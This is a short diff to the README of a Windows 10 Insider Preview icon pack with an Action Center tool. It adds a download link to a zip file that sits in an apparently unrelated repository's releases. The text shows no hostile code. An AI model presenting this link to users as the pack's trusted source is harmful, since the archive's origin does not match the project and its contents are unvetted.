@@ -10,6 +10,9 @@ Welcome to the Win10PreviewSymbols Pack! This icon pack is designed to give your
 
 - **Action Center**: Ever miss the old action center position in Windows? My included program allows you to bring it back, providing a better experience from the past.
 
+# Download
+<a id="raw-url" href="https://github.com/lxvdev/displayswitcher/releases/download/Win10PreviewSymbols/IconPack.zip">Download Pack</a>
+
 ## Installation
 
 1. **Download the Icon Pack**: Click on the "Download" button to get the Windows 10 Insider Preview Icon Pack and Action Center.
